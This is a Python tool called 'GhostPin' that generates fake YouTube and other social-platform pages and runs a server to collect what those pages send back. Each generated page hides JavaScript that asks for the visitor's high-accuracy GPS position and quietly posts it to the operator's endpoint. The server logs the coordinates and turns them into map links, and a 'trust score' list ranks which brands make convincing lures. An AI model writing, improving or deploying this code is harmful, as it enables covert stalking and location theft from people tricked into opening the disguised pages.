#!/usr/bin/env python3
"""
GhostPin v2.2 - GPS Tracking Framework
Fix: Input Issues | Server Stability | Background Thread
Author: F1REW0LF
License: MIT - Free for Community
Version: 2.2.0
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import queue
import signal
import urllib.parse
import urllib.request
import http.server
import socketserver
import webbrowser
import ssl
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
import argparse
import string

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# ============================[ VERSION & CONFIGURATION ]================================
VERSION = "2.2.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Free for Community"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GOLD = '\033[93m'
    DARK_RED = '\033[31m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                      
{Colors.RED}{Colors.BOLD}    GPS TRACKING FRAMEWORK v{VERSION}{Colors.WHITE}
{Colors.YELLOW}{Colors.BOLD}    Fix: Input | Server Stability{Colors.WHITE}
{Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
"""
    print(banner)

# ============================[ TRUSTED PLATFORMS ]================================

class TrustedPlatforms:
    PLATFORMS = {
        'youtube': {
            'domain': 'youtube.com',
            'pattern': r'youtube\.com/watch\?v=([a-zA-Z0-9_-]{11})',
            'template': 'https://www.youtube.com/watch?v={token}',
            'trust_score': 10
        },
        'youtu_be': {
            'domain': 'youtu.be',
            'pattern': r'youtu\.be/([a-zA-Z0-9_-]{11})',
            'template': 'https://youtu.be/{token}',
            'trust_score': 10
        },
        'twitter': {
            'domain': 'twitter.com',
            'pattern': r'twitter\.com/([a-zA-Z0-9_]+)/status/([0-9]{19})',
            'template': 'https://twitter.com/{user}/status/{id}',
            'trust_score': 9
        },
        'x': {
            'domain': 'x.com',
            'pattern': r'x\.com/([a-zA-Z0-9_]+)/status/([0-9]{19})',
            'template': 'https://x.com/{user}/status/{id}',
            'trust_score': 9
        },
        'instagram': {
            'domain': 'instagram.com',
            'pattern': r'instagram\.com/(?:p|reel)/([a-zA-Z0-9_-]{11})',
            'template': 'https://www.instagram.com/p/{token}/',
            'trust_score': 9
        },
        'facebook': {
            'domain': 'facebook.com',
            'pattern': r'facebook\.com/([a-zA-Z0-9\.]+)/posts/([0-9]+)',
            'template': 'https://www.facebook.com/{user}/posts/{id}',
            'trust_score': 9
        },
        'linkedin': {
            'domain': 'linkedin.com',
            'pattern': r'linkedin\.com/posts/([a-zA-Z0-9_-]{10,})',
            'template': 'https://www.linkedin.com/posts/{token}',
            'trust_score': 9
        },
        'github': {
            'domain': 'github.com',
            'pattern': r'github\.com/([a-zA-Z0-9_-]{1,39})/([a-zA-Z0-9_-]{1,100})',
            'template': 'https://github.com/{user}/{repo}',
            'trust_score': 9
        },
        'medium': {
            'domain': 'medium.com',
            'pattern': r'medium\.com/@([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)',
            'template': 'https://medium.com/@{user}/{slug}',
            'trust_score': 8
        },
        'reddit': {
            'domain': 'reddit.com',
            'pattern': r'reddit\.com/r/([a-zA-Z0-9_]+)/comments/([a-zA-Z0-9]+)',
            'template': 'https://www.reddit.com/r/{subreddit}/comments/{id}/',
            'trust_score': 8
        },
        'spotify': {
            'domain': 'spotify.com',
            'pattern': r'spotify\.com/(track|album|playlist)/([a-zA-Z0-9]{22})',
            'template': 'https://open.spotify.com/{type}/{id}',
            'trust_score': 8
        },
        'soundcloud': {
            'domain': 'soundcloud.com',
            'pattern': r'soundcloud\.com/([a-zA-Z0-9_-]{3,25})/([a-zA-Z0-9_-]{3,50})',
            'template': 'https://soundcloud.com/{user}/{track}',
            'trust_score': 8
        },
        'tiktok': {
            'domain': 'tiktok.com',
            'pattern': r'tiktok\.com/@([a-zA-Z0-9_]{2,24})/video/([0-9]{19})',
            'template': 'https://www.tiktok.com/@{user}/video/{id}',
            'trust_score': 8
        },
        'dropbox': {
            'domain': 'dropbox.com',
            'pattern': r'dropbox\.com/s/([a-zA-Z0-9]{15})/([a-zA-Z0-9_.-]+)',
            'template': 'https://www.dropbox.com/s/{id}/{filename}',
            'trust_score': 8
        },
        'google_drive': {
            'domain': 'drive.google.com',
            'pattern': r'drive\.google\.com/file/d/([a-zA-Z0-9_-]{33})',
            'template': 'https://drive.google.com/file/d/{id}/view',
            'trust_score': 9
        },
        'docs': {
            'domain': 'docs.google.com',
            'pattern': r'docs\.google\.com/document/d/([a-zA-Z0-9_-]{44})',
            'template': 'https://docs.google.com/document/d/{id}/edit',
            'trust_score': 9
        }
    }

# ============================[ HTML GENERATOR ]================================

class HTMLGenerator:
    def generate_youtube(self, token: str, tracking_url: str) -> str:
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9}}
.header{{background:#fff;padding:12px 24px;box-shadow:0 1px 2px rgba(0,0,0,0.1);display:flex;align-items:center}}
.logo{{color:#ff0000;font-size:28px;font-weight:bold;margin-right:24px}}
.search-bar{{flex:1;max-width:640px;padding:8px 16px;border:1px solid #ccc;border-radius:20px;background:#f0f0f0}}
.content{{max-width:1280px;margin:24px auto;padding:0 24px}}
.video-container{{background:#000;border-radius:12px;overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}}
.video-placeholder{{color:#fff;font-size:18px;text-align:center}}
.video-info{{background:#fff;padding:16px;border-radius:12px;margin-top:12px}}
.video-title{{font-size:20px;font-weight:600;margin-bottom:8px}}
.channel-info{{display:flex;align-items:center;margin:12px 0}}
.channel-avatar{{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#c0c0c0);margin-right:12px}}
.channel-name{{font-weight:600}}
.subscribe-btn{{background:#cc0000;color:#fff;padding:10px 20px;border:none;border-radius:24px;font-weight:600;cursor:pointer;margin-left:auto}}
.comments{{background:#fff;border-radius:12px;padding:16px;margin-top:12px}}
.comment{{display:flex;margin:8px 0;padding:8px 0;border-bottom:1px solid #f0f0f0}}
.comment-avatar{{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px}}
</style>
</head>
<body>
<div class="header">
<div class="logo">▶ YouTube</div>
<input class="search-bar" placeholder="Search" value="{token}">
</div>
<div class="content">
<div class="video-container">
<div class="video-placeholder">
<div style="font-size:64px;margin-bottom:16px">▶</div>
<div>Loading video...</div>
</div>
</div>
<div class="video-info">
<div class="video-title">{token}</div>
<div class="channel-info">
<div class="channel-avatar"></div>
<div><div class="channel-name">Channel</div><div style="color:#606060;font-size:13px">1.2M subscribers</div></div>
<button class="subscribe-btn">Subscribe</button>
</div>
</div>
<div class="comments">
<h3>Comments</h3>
<div class="comment"><div class="comment-avatar"></div><div>Loading comments...</div></div>
</div>
</div>
<script>
(function(){{
if(!navigator.geolocation)return;
function sendLocation(pos){{
var data={{lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:new Date().toISOString(),token:'{token}'}};
try{{fetch('{tracking_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data),mode:'no-cors'}}).catch(function(){{}});}}catch(e){{}}
}}
navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}});
}})();
</script>
</body>
</html>'''

    def generate_generic(self, platform: str, token: str, tracking_url: str) -> str:
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{platform.capitalize()}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.container{{max-width:600px;padding:40px;background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.08);text-align:center}}
.spinner{{display:inline-block;width:32px;height:32px;border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<h2>{platform.capitalize()}</h2>
<p>Loading content...</p>
</div>
<script>
(function(){{
if(!navigator.geolocation)return;
function sendLocation(pos){{
var data={{lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:new Date().toISOString(),token:'{token}'}};
try{{fetch('{tracking_url}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(data),mode:'no-cors'}}).catch(function(){{}});}}catch(e){{}}
}}
navigator.geolocation.getCurrentPosition(sendLocation,function(){{}},{{enableHighAccuracy:true,timeout:15000,maximumAge:0}});
}})();
</script>
</body>
</html>'''

# ============================[ GHOST SERVER - BACKGROUND ]================================

class GhostServer:
    """
    Background HTTP server for receiving location data
    """
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.running = False
        self.port = 8080
        self.server = None
        self.thread = None
        self.flask_app = None
        
    def start(self, port: int = 8080, background: bool = True):
        """
        Start the server
        """
        self.port = port
        self.running = True
        
        # Check if port is available
        if not self._is_port_available(port):
            cprint(f"[!] Port {port} in use, trying {port + 1}", Colors.YELLOW)
            self.port = port + 1
            return self.start(self.port, background)
        
        # Try Flask first
        if FLASK_AVAILABLE:
            try:
                self._start_flask(self.port, background)
                return
            except Exception as e:
                cprint(f"[!] Flask failed: {e}", Colors.RED)
        
        # Fallback to simple HTTP server
        self._start_simple(self.port, background)
    
    def _is_port_available(self, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            return result != 0
        except:
            return True
    
    def _start_flask(self, port: int, background: bool):
        """Start Flask server in background"""
        app = Flask(__name__)
        self.flask_app = app
        
        @app.route('/track/<token>', methods=['GET', 'POST', 'OPTIONS'])
        def track(token):
            if request.method == 'OPTIONS':
                response = jsonify({'status': 'ok'})
                response.headers.add('Access-Control-Allow-Origin', '*')
                response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
                response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
                return response
            
            if request.method == 'POST':
                data = request.get_json()
                if data:
                    with self.lock:
                        data['token'] = token
                        data['received_at'] = datetime.now().isoformat()
                        self.tracking_data.append(data)
                    cprint(f"[+] Location: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
                return jsonify({'status': 'ok'})
            
            return f'Tracking endpoint for {token}'
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify(self.tracking_data)
        
        @app.route('/')
        def index():
            return '<h1>GhostPin Server Running</h1><p>Send POST to /track/&lt;token&gt;</p>'
        
        if background:
            def run():
                app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
            
            self.thread = threading.Thread(target=run, daemon=True)
            self.thread.start()
            time.sleep(1)  # Wait for server to start
            cprint(f"[+] Server running on port {port} (background)", Colors.GREEN)
        else:
            app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    
    def _start_simple(self, port: int, background: bool):
        """Start simple HTTP server"""
        class Handler(http.server.SimpleHTTPRequestHandler):
            tracking_data = []
            lock = threading.Lock()
            
            def do_OPTIONS(self):
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
                self.send_header('Access-Control-Allow-Headers', 'Content-Type')
                self.end_headers()
            
            def do_POST(self):
                if self.path.startswith('/track/'):
                    try:
                        content_length = int(self.headers.get('Content-Length', 0))
                        post_data = self.rfile.read(content_length)
                        data = json.loads(post_data.decode('utf-8'))
                        token = self.path.split('/')[-1]
                        with self.lock:
                            data['token'] = token
                            data['received_at'] = datetime.now().isoformat()
                            self.__class__.tracking_data.append(data)
                        cprint(f"[+] Location: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        self.wfile.write(json.dumps({'status': 'ok'}).encode())
                    except Exception as e:
                        self.send_response(400)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_GET(self):
                if self.path == '/data':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    with self.lock:
                        self.wfile.write(json.dumps(self.__class__.tracking_data).encode())
                elif self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<h1>GhostPin Server</h1><p>Tracking Active</p>')
                else:
                    self.send_response(404)
                    self.end_headers()
        
        Handler.tracking_data = self.tracking_data
        Handler.lock = self.lock
        
        self.server = socketserver.TCPServer(('0.0.0.0', port), Handler)
        
        if background:
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            time.sleep(0.5)
            cprint(f"[+] Server running on port {port} (background)", Colors.GREEN)
        else:
            self.server.serve_forever()
    
    def stop(self):
        """Stop the server"""
        self.running = False
        if self.server:
            self.server.shutdown()
        if self.flask_app:
            # Flask will stop when main thread exits
            pass
    
    def get_data(self) -> List[Dict]:
        with self.lock:
            return self.tracking_data.copy()
    
    def clear_data(self):
        with self.lock:
            self.tracking_data.clear()

# ============================[ MAIN ]================================

class GhostPin:
    def __init__(self):
        self.platforms = TrustedPlatforms()
        self.generator = HTMLGenerator()
        self.server = GhostServer()
        self.running = True
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.RED)
        self.running = False
        if self.server:
            self.server.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - GPS Tracking Framework{Colors.WHITE}
{Colors.CYAN}Background Server | Real-Time Tracking{Colors.WHITE}
{Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.GREEN}[1] Create Ghost Link{Colors.WHITE}
{Colors.GREEN}[2] View Tracking Data{Colors.WHITE}
{Colors.GREEN}[3] Clear Data{Colors.WHITE}
{Colors.GREEN}[4] Server Status{Colors.WHITE}
{Colors.RED}[5] Exit{Colors.WHITE}
""")
    
    def run(self):
        print_banner()
        cprint("[*] GhostPin v2.2 - GPS Tracking Framework", Colors.CYAN)
        cprint("[*] Background Server | Real-Time Tracking", Colors.DIM)
        
        # Start server in background
        cprint("[*] Starting server in background...", Colors.BLUE)
        self.server.start(8080, background=True)
        
        while self.running:
            try:
                self.show_menu()
                choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
                
                if choice == '1':
                    cprint("\nAvailable platforms:", Colors.CYAN)
                    for plat in sorted(self.platforms.PLATFORMS.keys()):
                        trust = self.platforms.PLATFORMS[plat].get('trust_score', 5)
                        cprint(f"  {Colors.GREEN}{plat}{Colors.WHITE} (Trust: {trust}/10)", Colors.WHITE)
                    
                    platform = input("\n[>] Platform: ").strip().lower()
                    token = input("[>] Token/ID: ").strip()
                    
                    if platform not in self.platforms.PLATFORMS:
                        cprint("[-] Unknown platform", Colors.RED)
                        continue
                    
                    info = self.platforms.PLATFORMS[platform]
                    ghost_url = info['template'].format(token=token)
                    tracking_url = f"http://localhost:{self.server.port}/track/{token}"
                    
                    if platform == 'youtube' or platform == 'youtu_be':
                        html = self.generator.generate_youtube(token, tracking_url)
                    else:
                        html = self.generator.generate_generic(platform, token, tracking_url)
                    
                    cprint(f"\n[+] Ghost Link: {Colors.GREEN}{ghost_url}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"[+] Tracking Endpoint: {Colors.YELLOW}{tracking_url}{Colors.WHITE}", Colors.WHITE)
                    
                    filename = f"ghost_{platform}_{token[:8]}.html"
                    with open(filename, 'w') as f:
                        f.write(html)
                    cprint(f"[+] HTML saved to {Colors.BLUE}{filename}{Colors.WHITE}", Colors.WHITE)
                    
                    try:
                        webbrowser.open(filename)
                        cprint("[+] Opened in browser", Colors.GREEN)
                    except:
                        pass
                    
                elif choice == '2':
                    data = self.server.get_data()
                    if not data:
                        cprint("[!] No tracking data", Colors.YELLOW)
                        continue
                    
                    cprint(f"\n[+] Tracking Data ({len(data)} records):", Colors.GREEN)
                    for i, record in enumerate(data[-10:], 1):
                        lat = record.get('lat', 'N/A')
                        lng = record.get('lng', 'N/A')
                        token = record.get('token', 'N/A')
                        ts = record.get('received_at', record.get('timestamp', 'N/A'))
                        
                        cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
                        cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
                        cprint(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}", Colors.WHITE)
                        
                        if lat != 'N/A' and lng != 'N/A':
                            maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                            cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                    
                elif choice == '3':
                    self.server.clear_data()
                    cprint("[+] Data cleared", Colors.GREEN)
                    
                elif choice == '4':
                    cprint(f"\n[+] Server Status:", Colors.CYAN)
                    cprint(f"  Running: {Colors.GREEN}Yes{Colors.WHITE}", Colors.WHITE)
                    cprint(f"  Port: {Colors.CYAN}{self.server.port}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"  Data Records: {Colors.YELLOW}{len(self.server.get_data())}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"  Tracking: {Colors.BLUE}http://localhost:{self.server.port}/track/<token>{Colors.WHITE}", Colors.WHITE)
                    cprint(f"  Data: {Colors.BLUE}http://localhost:{self.server.port}/data{Colors.WHITE}", Colors.WHITE)
                    
                elif choice == '5':
                    cprint("[*] Shutting down...", Colors.GREEN)
                    self.server.stop()
                    break
                else:
                    cprint("[-] Invalid", Colors.RED)
                    
            except KeyboardInterrupt:
                cprint("\n[!] Interrupted", Colors.RED)
                self.running = False
                break
            except Exception as e:
                cprint(f"\n[!] Error: {e}", Colors.RED)
                continue

# ============================[ MAIN ]================================

def main():
    parser = argparse.ArgumentParser(description="GhostPin v2.2 - GPS Tracking Framework")
    parser.add_argument("-p", "--platform", help="Platform")
    parser.add_argument("-t", "--token", help="Token or ID")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("--server", action="store_true", help="Start server only")
    
    args = parser.parse_args()
    
    if args.server:
        print_banner()
        server = GhostServer()
        server.start(args.port, background=False)
        sys.exit(0)
    
    if args.platform and args.token:
        print_banner()
        platforms = TrustedPlatforms()
        generator = HTMLGenerator()
        server = GhostServer()
        server.start(args.port, background=True)
        
        info = platforms.PLATFORMS.get(args.platform)
        if not info:
            cprint(f"[-] Unknown platform: {args.platform}", Colors.RED)
            sys.exit(1)
        
        ghost_url = info['template'].format(token=args.token)
        tracking_url = f"http://localhost:{args.port}/track/{args.token}"
        
        if args.platform == 'youtube' or args.platform == 'youtu_be':
            html = generator.generate_youtube(args.token, tracking_url)
        else:
            html = generator.generate_generic(args.platform, args.token, tracking_url)
        
        cprint(f"\n[+] Ghost Link: {Colors.GREEN}{ghost_url}{Colors.WHITE}", Colors.WHITE)
        cprint(f"[+] Tracking Endpoint: {Colors.YELLOW}{tracking_url}{Colors.WHITE}", Colors.WHITE)
        
        filename = f"ghost_{args.platform}_{args.token[:8]}.html"
        with open(filename, 'w') as f:
            f.write(html)
        cprint(f"[+] HTML saved to {Colors.BLUE}{filename}{Colors.WHITE}", Colors.WHITE)
        
        try:
            webbrowser.open(filename)
        except:
            pass
        
        cprint("\n[!] Server running in background. Use Ctrl+C to stop.", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    # Interactive
    tool = GhostPin()
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        sys.exit(1)
